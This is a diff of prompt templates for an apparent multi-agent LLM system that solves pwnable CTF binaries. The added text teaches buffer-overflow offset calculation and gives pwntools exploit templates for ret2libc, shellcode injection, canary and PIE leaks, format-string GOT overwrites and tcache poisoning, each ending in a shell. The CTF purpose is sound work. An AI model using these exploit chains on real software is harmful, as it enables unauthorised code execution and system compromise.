@@ -198,12 +198,6 @@ Decompile specific functions to find vulnerabilities. Use this after identifying
 }
 ```
 
-**Parameters:**
-- `function_name` (str, optional): Function name to decompile
-- `function_address` (str, optional): Function address (hex string like "0x401234")
-
-**Note**: Provide either `function_name` OR `function_address`, not both.
-
 ### Example Output
 ```c
 void vuln(void) {
@@ -213,23 +207,102 @@ void vuln(void) {
 }
 ```
 
-### Vulnerability Patterns to Identify
+---
 
-| Pattern | Vulnerability | Exploitation |
-|---------|--------------|--------------|
-| `gets(buf)` | Buffer Overflow | No size limit - overflow to RIP |
-| `scanf("%s", buf)` | Buffer Overflow | No size limit |
-| `strcpy(dst, src)` | Buffer Overflow | No size check |
-| `sprintf(buf, fmt, ...)` | Buffer Overflow | Output may exceed buffer |
-| `printf(user_input)` | Format String | Leak/write via %n, %p |
-| `read(0, buf, 0x100)` | Buffer Overflow | If 0x100 > sizeof(buf) |
-| `free(ptr); *ptr` | Use-After-Free | Dangling pointer access |
-| `malloc` without check | Heap Overflow | Check for adjacent allocations |
+## CRITICAL: Vulnerability Patterns & Offset Calculation
 
-### When to Use
-- After finding interesting function names from main decompilation
-- When you need to understand specific vulnerable code
-- To calculate buffer sizes and offsets for exploitation
+### Buffer Overflow Patterns
+
+| Pattern | Severity | Offset Calculation |
+|---------|----------|-------------------|
+| `char buf[N]; gets(buf)` | CRITICAL | offset = N + 8 |
+| `char buf[N]; scanf("%s", buf)` | CRITICAL | offset = N + 8 |
+| `char buf[N]; read(0, buf, M)` where M > N | HIGH | offset = N + 8 |
+| `char buf[N]; strcpy(buf, src)` | HIGH | offset = N + 8 |
+| `char buf[N]; fgets(buf, M, stdin)` where M > N | MEDIUM | offset = N + 8 |
+
+### Offset Calculation Examples
+
+**Example 1: Simple buffer**
+```c
+void vuln(void) {
+    char buf[64];  // 64 bytes at RBP-0x40
+    gets(buf);
+}
+// Offset to RIP = 64 + 8 = 72 bytes
+```
+
+**Example 2: Multiple local variables**
+```c
+void vuln(void) {
+    char buf[32];   // RBP-0x30
+    int x;          // RBP-0x34
+    long y;         // RBP-0x40
+    gets(buf);
+}
+// Stack: [buf:32][x:4][y:8][padding?][saved_rbp:8][ret_addr:8]
+// Check actual layout with: sub rsp, 0xXX instruction
+// Offset = distance from buf to saved_rbp + 8
+```
+
+**Example 3: Ghidra variable notation**
+```c
+void vuln(void) {
+    char local_48[64];  // Ghidra names it local_48 = at RBP-0x48
+    gets(local_48);
+}
+// local_48 means offset 0x48 from RBP
+// Offset to RIP = 0x48 + 8 = 0x50 = 80 bytes
+```
+
+### Format String Patterns
+
+| Pattern | What to do |
+|---------|------------|
+| `printf(user_input)` | Find stack offset with %p, use %n for write |
+| `sprintf(buf, user_input)` | Format string + potential overflow |
+| `fprintf(f, user_input)` | Same as printf |
+| `snprintf(buf, n, user_input)` | Format string (limited overflow) |
+
+### Heap Patterns
+
+| Pattern | Vulnerability |
+|---------|---------------|
+| `free(ptr); func(ptr)` | Use-After-Free |
+| `free(ptr); free(ptr)` | Double Free |
+| `malloc(user_size)` without check | Heap manipulation |
+| `realloc(ptr, new_size)` | Potential UAF if fails |
+
+---
+
+## Reading Ghidra Decompiled Code
+
+### Variable Naming Convention
+- `local_XX` = Local variable at RBP-0xXX
+- `param_N` = Nth function parameter
+- `DAT_XXXXXX` = Global data at address
+- `FUN_XXXXXX` = Function at address
+
+### Stack Layout Reconstruction
+```c
+void vuln(void) {
+    undefined8 local_48;  // RBP-0x48, 8 bytes
+    undefined4 local_40;  // RBP-0x40, 4 bytes
+    char local_3c[44];    // RBP-0x3c, 44 bytes
+    // ...
+}
+
+// To find offset from local_3c to RIP:
+// local_3c is at RBP-0x3c = RBP-60
+// Need to fill: 60 bytes (to RBP) + 8 bytes (saved RBP) = 68 bytes to RIP
+```
+
+### Common Win Functions to Look For
+- `win`, `flag`, `shell`, `system`, `backdoor`
+- Functions that call `system("/bin/sh")` or read flag file
+- If found: Simple ret2win (overflow → jump to win)
+
+---
 
 ### Analysis Output Format
 ```json
@@ -244,12 +317,21 @@ void vuln(void) {
     "vulnerabilities": [
       {
         "type": "buffer_overflow",
+        "severity": "critical",
         "function": "vuln",
-        "location": "line 3",
+        "location": "0x401150",
+        "buffer_var": "local_48",
+        "buffer_size": 64,
+        "estimated_offset": 72,
         "description": "64-byte buffer with gets() - no bounds checking",
-        "code_snippet": "char buf[64]; gets(buf);"
+        "code_snippet": "char local_48[64]; gets(local_48);"
       }
-    ]
+    ],
+    "offsets": {
+      "buffer_to_rbp": 64,
+      "buffer_to_rip": 72,
+      "verified": false
+    }
   }
 }
 ```
@@ -834,14 +916,15 @@ PLAN_SYSTEM = env.from_string("""You are the **Plan Agent** for a pwnable CTF so
 
 ## Your Role
 1. Analyze the current Analysis Document
-2. Identify what information is missing ([NOT YET] sections)
-3. Create 2-4 prioritized tasks to fill those gaps
+2. Follow the PHASED ANALYSIS WORKFLOW below
+3. Create 2-4 prioritized tasks for the current phase
 4. Update the Analysis Document with any new findings
 
 ## Output Format (STRICT JSON)
 ```json
 {
   "reasoning": "Brief explanation of your analysis and decisions",
+  "current_phase": "recon",
   "tasks": [
     {
       "id": "task_001",
@@ -851,25 +934,150 @@ PLAN_SYSTEM = env.from_string("""You are the **Plan Agent** for a pwnable CTF so
       "priority": 0.9
     }
   ],
-  "analysis_updates": {
-    "checksec": {"done": true, "result": "..."},
-    "vulnerabilities": [{"type": "buffer_overflow", ...}]
-  },
+  "analysis_updates": {},
   "next_focus": "What to prioritize next"
 }
 ```
 
-## Task Priority Guidelines
-- **0.9-1.0**: Critical path (checksec, main decompile)
-- **0.7-0.8**: Important (vuln function analysis, libc identification)
-- **0.5-0.6**: Useful (gadget search, one_gadget)
-- **0.3-0.4**: Optional (additional function analysis)
+---
 
-## Analysis Document Sections to Fill
-1. **Binary Information**: checksec, decompile, disasm
-2. **Vulnerability Analysis**: identified vulns, exploitation strategy
-3. **Libc / Libraries**: detection, one_gadgets, offsets
-4. **ROP / Gadgets**: key gadgets for exploitation
+## CRITICAL: Phased Analysis Workflow
+
+### Phase 1: RECON (First iteration)
+**Goal: Understand the binary and protections**
+
+| Priority | Task | Tool | Why |
+|----------|------|------|-----|
+| 0.95 | Check protections | `Checksec` | Determines entire exploit strategy |
+| 0.90 | Decompile main | `Ghidra_main` | Understand program flow |
+| 0.85 | Check for libc | `Pwninit` | Sets up correct environment |
+| 0.80 | List files | `Run: ls -la` | Find provided files (libc, etc.) |
+
+**Checklist before moving to Phase 2:**
+- [ ] Checksec completed
+- [ ] Main function decompiled
+- [ ] Know if libc is provided
+
+### Phase 2: VULNERABILITY HUNT
+**Goal: Find exploitable vulnerabilities**
+
+| Priority | Task | Tool | When to use |
+|----------|------|------|-------------|
+| 0.90 | Decompile suspicious functions | `Ghidra_decompile_function` | After seeing function calls in main |
+| 0.85 | Search for dangerous functions | `Run: objdump -d \| grep -E "gets\|strcpy\|sprintf"` | Quick pattern scan |
+| 0.80 | Analyze input handling | Decompile functions with read/scanf/gets | Look for overflow |
+| 0.75 | Check for format strings | Look for printf(user_input) | Format string attack |
+
+**What to look for:**
+```c
+// Buffer Overflow
+char buf[64];
+gets(buf);           // CRITICAL: No bounds check
+read(0, buf, 0x100); // If 0x100 > sizeof(buf)
+
+// Format String
+printf(user_input);  // CRITICAL: User controls format
+
+// Use-After-Free
+free(ptr);
+ptr->field = value;  // CRITICAL: Dangling pointer
+```
+
+**Checklist before moving to Phase 3:**
+- [ ] At least one vulnerability identified
+- [ ] Vulnerability type known
+- [ ] Vulnerable function decompiled
+
+### Phase 3: EXPLOITATION PREP
+**Goal: Gather all primitives needed for exploitation**
+
+#### For Buffer Overflow:
+| Priority | Task | Tool |
+|----------|------|------|
+| 0.90 | Calculate offset | From decompiled code: `buf[N]` → offset ≈ N+8 |
+| 0.85 | Find ROP gadgets | `ROPgadget: pop rdi` |
+| 0.85 | Find leak target | GOT entry for puts/printf |
+| 0.80 | Get libc offsets | `One_gadget` or symbol parsing |
+
+**Offset Calculation (x86-64):**
+```
+char buf[64] at RBP-0x40
+Offset to RIP = 64 (buffer) + 8 (saved RBP) = 72 bytes
+
+VERIFY with GDB if unsure:
+1. Create cyclic pattern: cyclic(100)
+2. Send to binary
+3. Check crash: RIP value
+4. Find offset: cyclic_find(rip_value)
+```
+
+#### For Format String:
+| Priority | Task | Tool |
+|----------|------|------|
+| 0.90 | Find format offset | Test with %p patterns |
+| 0.85 | Identify write target | GOT entry or return address |
+| 0.80 | Calculate write value | one_gadget or system address |
+
+#### For Heap:
+| Priority | Task | Tool |
+|----------|------|------|
+| 0.90 | Identify heap primitive | UAF, double-free, overflow |
+| 0.85 | Find hook address | __malloc_hook, __free_hook |
+| 0.80 | Calculate offsets | Chunk sizes, tcache layout |
+
+**Checklist before moving to Phase 4:**
+- [ ] Offset/primitive confirmed
+- [ ] If NX: ROP gadgets found
+- [ ] If need leak: leak method identified
+- [ ] Attack chain clear
+
+### Phase 4: VERIFICATION (Optional but recommended)
+**Goal: Verify assumptions before exploit generation**
+
+| Priority | Task | Tool |
+|----------|------|------|
+| 0.90 | Verify offset with GDB | `Pwndbg: break vulnerable_func, run, examine stack` |
+| 0.85 | Test leak works | `Pwndbg: verify GOT contains valid libc address` |
+| 0.80 | Check gadget alignment | Ensure 16-byte RSP alignment |
+
+---
+
+## Common Analysis Patterns
+
+### Pattern A: Simple ret2libc (No canary, No PIE, NX)
+```
+1. Checksec → No canary, No PIE, NX enabled
+2. Ghidra_main → finds vuln() call
+3. Ghidra_decompile_function vuln → finds gets(buf[64])
+4. ROPgadget query="pop rdi" → 0x401234
+5. Check puts@plt, puts@got exists
+6. READY: overflow → leak → ret2libc
+```
+
+### Pattern B: Format String GOT Overwrite
+```
+1. Checksec → Partial RELRO (GOT writable)
+2. Ghidra_main → finds printf(user_input)
+3. Test format offset with %p
+4. One_gadget → find gadget
+5. READY: fmt write GOT → one_gadget
+```
+
+### Pattern C: Canary Bypass
+```
+1. Checksec → Canary found
+2. Look for format string or other leak
+3. Leak canary first
+4. Then proceed with standard BOF
+```
+
+---
+
+## Task Priority Guidelines
+- **0.9-1.0**: Current phase critical tasks
+- **0.7-0.8**: Supporting tasks for current phase
+- **0.5-0.6**: Next phase prep
+- **0.3-0.4**: Optional/backup approaches
 
 {{ tool_descriptions }}
 """)
@@ -938,7 +1146,7 @@ PARSING_SYSTEM = env.from_string("""You are the **Parsing Agent** for a pwnable 
 1. Parse the raw output from tool executions
 2. Extract structured information for the Analysis Document
 3. Identify key findings and potential vulnerabilities
-4. Format results for easy LLM comprehension
+4. **CRITICAL: Extract buffer sizes and calculate offsets**
 
 ## Output Format (STRICT JSON)
 ```json
@@ -947,40 +1155,168 @@ PARSING_SYSTEM = env.from_string("""You are the **Parsing Agent** for a pwnable 
   "analysis_updates": {
     "checksec": {
       "done": true,
-      "result": "NX enabled, No canary, No PIE, Partial RELRO"
+      "result": "NX enabled, No canary, No PIE, Partial RELRO",
+      "nx": true,
+      "canary": false,
+      "pie": false,
+      "relro": "partial"
     },
     "decompile": {
       "done": true,
       "functions": [
         {
-          "name": "main",
+          "name": "vuln",
           "address": "0x401156",
-          "code": "int main() { ... }"
+          "code": "void vuln() { char buf[64]; gets(buf); }"
         }
       ]
     },
     "vulnerabilities": [
       {
         "type": "buffer_overflow",
+        "severity": "critical",
         "function": "vuln",
-        "location": "line 15",
+        "location": "0x401160",
         "description": "64-byte buffer with gets() - no bounds checking",
-        "code_snippet": "char buf[64]; gets(buf);"
+        "buffer_size": 64,
+        "estimated_offset": 72,
+        "code_snippet": "char buf[64]; gets(buf);",
+        "exploit_primitive": "control_rip"
       }
-    ]
+    ],
+    "offsets": {
+      "buffer_to_rbp": 64,
+      "buffer_to_rip": 72,
+      "verified": false
+    }
   },
-  "key_findings": [
-    "No stack canary - buffer overflow is exploitable",
-    "No PIE - addresses are fixed",
-    "gets() used without bounds checking"
-  ],
+  "key_findings": ["..."],
   "errors": []
 }
 ```
 
+---
+
+## CRITICAL: Vulnerability Pattern Recognition
+
+### 1. Buffer Overflow Patterns
+
+| Pattern | Severity | Buffer Size Calculation |
+|---------|----------|-------------------------|
+| `char buf[N]; gets(buf)` | CRITICAL | offset = N + 8 (rbp) = N + 8 to RIP |
+| `char buf[N]; scanf("%s", buf)` | CRITICAL | Same as gets() |
+| `char buf[N]; read(0, buf, M)` where M > N | HIGH | offset = N + 8 if M > N |
+| `char buf[N]; strcpy(buf, src)` | HIGH | Depends on src length |
+| `char buf[N]; sprintf(buf, fmt, ...)` | MEDIUM | Depends on format output |
+
+**Offset Calculation Formula (x86-64):**
+```
+offset_to_rip = buffer_size + 8 (saved RBP)
+
+Example: char buf[64]
+- buf starts at RBP-0x40 (64 bytes)
+- Fill 64 bytes to reach saved RBP
+- Fill 8 more bytes to overwrite saved RBP
+- Next 8 bytes overwrite return address (RIP)
+- Total offset: 64 + 8 = 72 bytes
+```
+
+**IMPORTANT: Stack alignment matters!**
+- Look for `sub rsp, 0xXX` in assembly to verify actual stack frame size
+- Local variables may have padding for alignment
+- Example: `char buf[64]` might actually use 0x50 (80) bytes due to alignment
+
+### 2. Format String Patterns
+
+| Pattern | Type | Exploitation |
+|---------|------|--------------|
+| `printf(user_input)` | Format String | Leak: %p, Write: %n |
+| `fprintf(f, user_input)` | Format String | Same as printf |
+| `sprintf(buf, user_input)` | Format String + Overflow | Double vulnerability |
+| `snprintf(buf, n, user_input)` | Format String | Leak possible, write with %n |
+
+**Format String Analysis:**
+- Count stack offset to user input: `%1$p, %2$p, ...` until you see your input
+- Typical offset: 6-15 for x86-64
+
+### 3. Heap Vulnerability Patterns
+
+| Pattern | Type | Notes |
+|---------|------|-------|
+| `free(ptr); use(ptr)` | Use-After-Free | Check if ptr is used after free |
+| `free(ptr); free(ptr)` | Double Free | tcache/fastbin corruption |
+| `malloc(size) without NULL check` | Heap Overflow | May return NULL on failure |
+| `realloc() to smaller` | Data Leak | Old data may remain |
+
+### 4. Integer Vulnerability Patterns
+
+| Pattern | Type |
+|---------|------|
+| `int size; read(0, &size, 4); malloc(size)` | Integer Overflow |
+| `unsigned - unsigned` | Integer Underflow |
+| `size_t to int conversion` | Sign confusion |
+
+---
+
+## Checksec Parsing
+
+When parsing checksec output, extract structured data:
+
+```
+Input: "RELRO: Partial RELRO, Stack: No canary found, NX: NX enabled, PIE: No PIE"
+
+Output:
+{
+  "checksec": {
+    "done": true,
+    "result": "Partial RELRO, No canary, NX enabled, No PIE",
+    "relro": "partial",    // "none" | "partial" | "full"
+    "canary": false,
+    "nx": true,
+    "pie": false,
+    "fortify": false
+  }
+}
+```
+
+**Exploitation Implications:**
+- `canary: false` → Direct stack overflow works
+- `pie: false` → Use fixed addresses (0x400000 base)
+- `nx: true` → Need ROP/ret2libc (no shellcode)
+- `relro: "partial"` → GOT overwrite possible
+- `relro: "full"` → GOT read-only, use __malloc_hook or pure ROP
+
+---
+
+## Gadget Parsing
+
+Extract gadgets in structured format:
+
+```json
+{
+  "gadgets": [
+    {"instruction": "pop rdi ; ret", "address": "0x401234"},
+    {"instruction": "pop rsi ; pop r15 ; ret", "address": "0x401236"},
+    {"instruction": "ret", "address": "0x40101a"}
+  ]
+}
+```
+
+---
+
+## Key Things to ALWAYS Extract
+
+1. **Buffer sizes**: `char buf[N]` → N bytes
+2. **Vulnerable functions**: gets, scanf %s, strcpy, printf(user)
+3. **Useful addresses**: main, win function, /bin/sh string
+4. **PLT entries**: puts@plt, system@plt, printf@plt
+5. **GOT entries**: For leak targets
+6. **ROP gadgets**: pop rdi, pop rsi, ret
+7. **Libc symbols**: If libc provided, extract key offsets
+
 ## Parsing Guidelines
 - Extract concrete values (addresses, sizes, offsets)
-- Identify vulnerability patterns (gets, strcpy, format strings, etc.)
+- **ALWAYS calculate estimated offset when buffer size is known**
 - Note protection status and exploitation implications
 - Keep code snippets concise but complete
 """)
@@ -998,43 +1334,170 @@ FEEDBACK_SYSTEM = env.from_string("""You are the **Feedback Agent** for a pwnabl
 {% endif %}
 
 ## Your Role
-1. Evaluate the current Analysis Document completeness
+1. Evaluate the current Analysis Document using the CHECKLIST below
 2. Identify what's still missing for successful exploitation
-3. Calculate exploit readiness score
-4. Provide specific feedback to Plan Agent
+3. Calculate exploit readiness score BASED ON CHECKLIST
+4. Provide specific, actionable feedback to Plan Agent
 
 ## Output Format (STRICT JSON)
 ```json
 {
   "reasoning": "Assessment of current progress",
-  "readiness_score": 0.6,
-  "completed_components": [
-    "Binary protections identified",
-    "Main function decompiled",
-    "Buffer overflow vulnerability found"
-  ],
-  "missing_components": [
-    "Need libc leak strategy",
-    "Need to find ROP gadgets for ret2libc"
-  ],
-  "feedback_to_plan": "Focus on finding a libc leak primitive. Check if there's a format string or other info leak. Then search for 'pop rdi' gadget.",
+  "checklist": {
+    "protections_analyzed": true,
+    "vulnerability_found": true,
+    "vulnerability_type": "buffer_overflow",
+    "buffer_size_known": true,
+    "offset_calculated": false,
+    "control_primitive": "rip",
+    "leak_needed": true,
+    "leak_method_found": false,
+    "gadgets_found": false,
+    "libc_available": true,
+    "exploit_strategy_clear": false
+  },
+  "readiness_score": 0.5,
+  "completed_components": ["..."],
+  "missing_components": ["..."],
+  "next_priority_action": "Find ROP gadgets (pop rdi; ret) for libc leak",
+  "feedback_to_plan": "...",
   "recommend_exploit": false,
   "loop_continue": true
 }
 ```
 
-## Readiness Score Guidelines
-- **0.0-0.3**: Initial reconnaissance
-- **0.4-0.5**: Vulnerability identified
-- **0.6-0.7**: Exploitation strategy clear
-- **0.8-0.9**: All primitives ready
-- **1.0**: Ready for exploit generation
+---
+
+## CRITICAL: Exploitation Readiness Checklist
+
+### Tier 1: Basic Requirements (Must have ALL)
+| Check | Description | How to verify |
+|-------|-------------|---------------|
+| ✅ `protections_analyzed` | Checksec completed | checksec.done == true |
+| ✅ `vulnerability_found` | At least one vuln identified | vulnerabilities[] not empty |
+| ✅ `vulnerability_type` | Type known (bof, fmt, heap, etc.) | vulnerabilities[0].type |
+
+### Tier 2: Exploitation Details (Based on vuln type)
+
+**For Buffer Overflow:**
+| Check | Description | Required? |
+|-------|-------------|-----------|
+| `buffer_size_known` | Know the buffer size (e.g., 64 bytes) | YES |
+| `offset_calculated` | Know exact offset to RIP/RBP | YES (can estimate: buf_size + 8) |
+| `control_primitive` | What can we control? (rip, rbp, etc.) | YES |
+
+**For Format String:**
+| Check | Description | Required? |
+|-------|-------------|-----------|
+| `fmt_offset_found` | Stack offset to input (%N$p) | YES |
+| `write_target_known` | Where to write (GOT, hook, etc.) | YES |
+
+**For Heap:**
+| Check | Description | Required? |
+|-------|-------------|-----------|
+| `heap_primitive` | UAF, double free, overflow? | YES |
+| `alloc_size_known` | Chunk sizes for attack | YES |
+
+### Tier 3: ROP/Libc Requirements
+
+| Check | When Required | Description |
+|-------|---------------|-------------|
+| `leak_needed` | NX=true + no win function | Need libc address |
+| `leak_method_found` | If leak_needed | How to leak (puts, printf, etc.) |
+| `gadgets_found` | NX=true | pop rdi, ret at minimum |
+| `libc_available` | For ret2libc | libc.so provided or identifiable |
+| `bin_sh_available` | For system() call | /bin/sh string or input |
+
+### Tier 4: Strategy Verification
+
+| Check | Description |
+|-------|-------------|
+| `exploit_strategy_clear` | Full attack chain understood |
+| `no_blockers` | No unsolved issues |
+
+---
+
+## Readiness Score Calculation
+
+Calculate based on checklist completion:
+
+```
+Tier 1 complete (3 items):     +0.3
+Tier 2 complete (vuln-specific): +0.3
+Tier 3 complete (if needed):   +0.3
+Tier 4 complete:               +0.1
+-------------------------------------
+Total:                         1.0
+```
+
+**Score Interpretation:**
+- **0.0-0.3**: Still gathering basic info
+- **0.3-0.5**: Vulnerability found, need details
+- **0.5-0.7**: Have details, need ROP/leak setup
+- **0.7-0.9**: Almost ready, minor items missing
+- **0.9-1.0**: READY FOR EXPLOIT
+
+---
 
 ## When to Recommend Exploit
-Set `recommend_exploit: true` when:
-- Readiness score >= 0.8
-- Clear exploitation path exists
-- All necessary primitives identified
+
+Set `recommend_exploit: true` ONLY when ALL of these are true:
+
+1. **Vulnerability fully understood**
+   - Type, location, and trigger known
+   - Buffer size or format offset known
+
+2. **Offset/primitive confirmed**
+   - For BOF: offset to RIP calculated
+   - For fmt: stack offset found
+
+3. **Attack chain complete**
+   - If NX: gadgets found
+   - If need leak: leak method found
+   - If need libc: libc offsets known or can calculate
+
+4. **No blockers**
+   - Canary handled (if present)
+   - PIE handled (if present)
+   - RELRO handled (if full)
+
+---
+
+## Specific Feedback Examples
+
+**Bad feedback (too vague):**
+```
+"Keep analyzing the binary"
+"Find more information"
+```
+
+**Good feedback (actionable):**
+```
+"Buffer size is 64 bytes. Calculate offset: 64 + 8 = 72 bytes to RIP. Next: find 'pop rdi; ret' gadget with ROPgadget query='pop rdi'"
+```
+
+```
+"Format string at printf(). Find stack offset by sending '%p '*20. Look for controllable input pattern in output. Then plan GOT overwrite."
+```
+
+```
+"Have BOF + gadgets. Missing: libc leak. Use puts@plt to print puts@got, then return to main for stage 2."
+```
+
+---
+
+## When to STOP the Loop
+
+Set `loop_continue: false` when:
+1. `recommend_exploit: true` (ready to exploit)
+2. Max iterations reached (system will handle)
+3. No progress after 3 iterations (stuck)
+4. Critical blocker found (e.g., no vulnerability found after full analysis)
+
+**DO NOT stop the loop if:**
+- Still missing key information
+- Haven't tried all analysis approaches
+- Vulnerability found but details incomplete
 """)
 
 
@@ -1064,32 +1527,251 @@ EXPLOIT_SYSTEM = env.from_string("""You are the **Exploit Agent** for a pwnable 
 {
   "reasoning": "Exploitation strategy explanation",
   "exploit_type": "ret2libc",
-  "exploit_code": "from pwn import *\\nimport os\\n\\n# Setup - MUST use absolute path\\ncontext.binary = '{{ binary_path }}'\\n\\n# Remote/Local switching\\nhost = os.environ.get('TARGET_HOST', 'localhost')\\nport = int(os.environ.get('TARGET_PORT', 1337))\\n\\ndef solve():\\n    p = remote(host, port) if args.REMOTE else process(context.binary.path)\\n    # ... exploit logic\\n    p.interactive()\\n\\nif __name__ == '__main__':\\n    solve()",
-  "key_steps": [
-    "1. Overflow buffer to control return address",
-    "2. Leak libc address via puts@plt",
-    "3. Return to main for second stage",
-    "4. Call system('/bin/sh')"
-  ],
-  "assumptions": [
-    "Libc version: 2.31",
-    "No ASLR or handled via leak"
-  ]
+  "exploit_code": "...",
+  "key_steps": ["1. ...", "2. ..."],
+  "assumptions": ["Libc version: 2.31"]
 }
 ```
 
+---
+
+## CRITICAL: Exploitation Strategy by Protection Combination
+
+### Case 1: No Canary + No PIE + NX Enabled (MOST COMMON)
+**Strategy: ret2libc (leak → call system)**
+
+```python
+from pwn import *
+
+context.binary = elf = ELF('{{ binary_path }}')
+libc = ELF('./libc.so.6')  # or libc = elf.libc
+
+def solve():
+    p = process(context.binary.path)
+
+    # Stage 1: Leak libc address
+    # Find: pop rdi; ret gadget and puts@plt
+    pop_rdi = 0x401234  # ROPgadget에서 찾은 값
+    ret = 0x40101a      # stack alignment용
+    puts_plt = elf.plt['puts']
+    puts_got = elf.got['puts']
+    main = elf.symbols['main']
+
+    # Overflow → leak puts@got → return to main
+    payload = flat(
+        b'A' * OFFSET,       # 오프셋 (분석에서 확인)
+        pop_rdi, puts_got,   # puts(puts@got)
+        puts_plt,
+        main                 # return to main for stage 2
+    )
+    p.sendline(payload)
+
+    # Parse leaked address
+    p.recvuntil(b'\\n')  # 필요시 조정
+    leaked = u64(p.recv(6).ljust(8, b'\\x00'))
+    log.info(f"Leaked puts: {hex(leaked)}")
+
+    # Calculate libc base
+    libc.address = leaked - libc.sym['puts']
+    log.success(f"Libc base: {hex(libc.address)}")
+
+    # Stage 2: Call system("/bin/sh")
+    bin_sh = next(libc.search(b'/bin/sh\\x00'))
+    system = libc.sym['system']
+
+    payload2 = flat(
+        b'A' * OFFSET,
+        ret,                 # Ubuntu 18.04+ stack alignment
+        pop_rdi, bin_sh,
+        system
+    )
+    p.sendline(payload2)
+    p.interactive()
+```
+
+### Case 2: No Canary + No PIE + NX Disabled
+**Strategy: Shellcode injection**
+
+```python
+from pwn import *
+
+context.binary = elf = ELF('{{ binary_path }}')
+context.arch = 'amd64'  # or 'i386'
+
+def solve():
+    p = process(context.binary.path)
+
+    # Generate shellcode
+    shellcode = asm(shellcraft.sh())
+
+    # Find buffer address (use GDB or known bss/stack address)
+    buf_addr = 0x404000  # .bss or stack address
+
+    # Payload: shellcode + padding + return to shellcode
+    payload = shellcode
+    payload += b'A' * (OFFSET - len(shellcode))
+    payload += p64(buf_addr)
+
+    p.sendline(payload)
+    p.interactive()
+```
+
+### Case 3: Canary + No PIE + NX Enabled
+**Strategy: Canary leak first, then ret2libc**
+
+```python
+from pwn import *
+
+def solve():
+    p = process(context.binary.path)
+
+    # Step 1: Leak canary (via format string or byte-by-byte brute force)
+    # Format string example:
+    p.sendline(b'%11$p')  # canary 위치는 분석 필요
+    canary = int(p.recv().strip(), 16)
+    log.info(f"Canary: {hex(canary)}")
+
+    # Step 2: Overflow with canary preserved
+    payload = flat(
+        b'A' * BUF_SIZE,
+        canary,           # 올바른 canary 값
+        b'B' * 8,         # saved RBP
+        # ... ROP chain for ret2libc
+    )
+    p.sendline(payload)
+    p.interactive()
+```
+
+### Case 4: PIE Enabled + No Canary
+**Strategy: Binary base leak first**
+
+```python
+from pwn import *
+
+def solve():
+    p = process(context.binary.path)
+
+    # Leak binary address (format string, stack address, etc.)
+    p.sendline(b'%p ' * 20)
+    leaks = p.recv().split()
+
+    # Find a binary address (usually starts with 0x55 or 0x56)
+    for leak in leaks:
+        addr = int(leak, 16)
+        if 0x550000000000 <= addr <= 0x570000000000:
+            # Calculate base (subtract known offset)
+            elf.address = addr - KNOWN_OFFSET
+            break
+
+    log.success(f"Binary base: {hex(elf.address)}")
+
+    # Now use elf.plt, elf.got, elf.sym with correct addresses
+    # ... continue with ret2libc
+```
+
+### Case 5: Full RELRO (GOT Read-Only)
+**Strategy: Cannot use GOT overwrite - use stack-based ROP or one_gadget**
+
+```python
+# GOT overwrite 불가능!
+# 대안:
+# 1. 순수 ROP chain으로 execve("/bin/sh", NULL, NULL)
+# 2. one_gadget 사용 (조건 맞으면)
+# 3. __malloc_hook / __free_hook overwrite (if not full RELRO for libc)
+
+# one_gadget 예시:
+one_gadget_offset = 0x4f3d5  # one_gadget 도구에서 찾은 값
+one_gadget = libc.address + one_gadget_offset
+
+# ROP로 one_gadget 호출
+payload = flat(
+    b'A' * OFFSET,
+    ret,          # alignment
+    one_gadget
+)
+```
+
+### Case 6: Format String Vulnerability
+**Strategy: Arbitrary read/write**
+
+```python
+from pwn import *
+
+def solve():
+    p = process(context.binary.path)
+
+    # Leak: %p, %s, %n$p
+    # Write: %n (writes number of printed chars)
+
+    # Example: Overwrite GOT entry with one_gadget
+    # Step 1: Leak libc
+    payload = b'AAAA%7$p'  # offset 찾기 필요
+    p.sendline(payload)
+
+    # Step 2: Calculate addresses
+    # Step 3: Use fmtstr_payload for arbitrary write
+    from pwnlib.fmtstr import fmtstr_payload
+
+    writes = {elf.got['exit']: one_gadget}
+    payload = fmtstr_payload(OFFSET, writes)
+    p.sendline(payload)
+```
+
+### Case 7: Heap Exploitation (UAF/Double Free)
+**Strategy: tcache/fastbin attack**
+
+```python
+from pwn import *
+
+def solve():
+    p = process(context.binary.path)
+
+    # Tcache poisoning example (glibc 2.27-2.31)
+    # 1. Allocate chunk
+    # 2. Free it
+    # 3. Edit freed chunk's fd pointer
+    # 4. Allocate twice to get arbitrary write
+
+    # Allocate
+    alloc(0x68, b'A' * 8)  # chunk 0
+    alloc(0x68, b'B' * 8)  # chunk 1
+
+    # Free
+    free(0)
+
+    # Edit freed chunk's fd to __free_hook
+    edit(0, p64(libc.sym['__free_hook']))
+
+    # Allocate twice
+    alloc(0x68, b'/bin/sh\\x00')  # chunk 2 (from tcache)
+    alloc(0x68, p64(libc.sym['system']))  # chunk 3 = __free_hook
+
+    # Trigger
+    free(2)  # system("/bin/sh")
+    p.interactive()
+```
+
+---
+
+## Common Mistakes to AVOID
+
+1. **Wrong offset**: ALWAYS verify offset with cyclic pattern or GDB
+2. **Missing stack alignment**: Ubuntu 18.04+ requires 16-byte aligned RSP before call
+   - Add extra `ret` gadget if needed
+3. **Null bytes in addresses**: Use write primitives or stage payloads
+4. **Forgetting newline**: Many programs use `gets/fgets` which include newline
+5. **PIE without leak**: Cannot use hardcoded addresses - must leak first
+6. **Canary without leak**: Stack smashing detected - must leak or bypass
+
 ## Exploit Code Guidelines
 - Use pwntools (`from pwn import *`)
-- **CRITICAL: Use ABSOLUTE paths for binary** - `context.binary = '{{ binary_path }}'` (NOT relative paths like `./vuln`)
-- **DEFAULT: Use process() for local testing** - pwninit has patched the binary, so test locally first!
+- **CRITICAL: Use ABSOLUTE paths for binary** - `context.binary = '{{ binary_path }}'`
+- **DEFAULT: Use process() for local testing** - pwninit has patched the binary!
 - Include logging (`log.info`, `log.success`)
 - Add comments explaining each step
-- Handle common issues (alignment, null bytes)
-- Connection pattern (LOCAL FIRST, then remote):
+- Connection pattern:
   ```python
   import os
-  # Default: local testing with pwninit-patched binary
-  # Use REMOTE flag or env vars for remote testing
   if args.REMOTE or os.environ.get('TARGET_HOST'):
       host = os.environ.get('TARGET_HOST', 'localhost')
       port = int(os.environ.get('TARGET_PORT', 1337))
@@ -1097,7 +1779,6 @@ EXPLOIT_SYSTEM = env.from_string("""You are the **Exploit Agent** for a pwnable 
   else:
       p = process(context.binary.path)
   ```
-- **NEVER hardcode remote addresses** like `remote('host.example.com', 12345)` - always use the pattern above
 
 {{ tool_descriptions }}
 """)
@@ -1138,6 +1819,41 @@ PLAN_USER = env.from_string("""## Current Analysis Document
 
 ---
 
+{% if crash_analysis and crash_analysis.performed %}
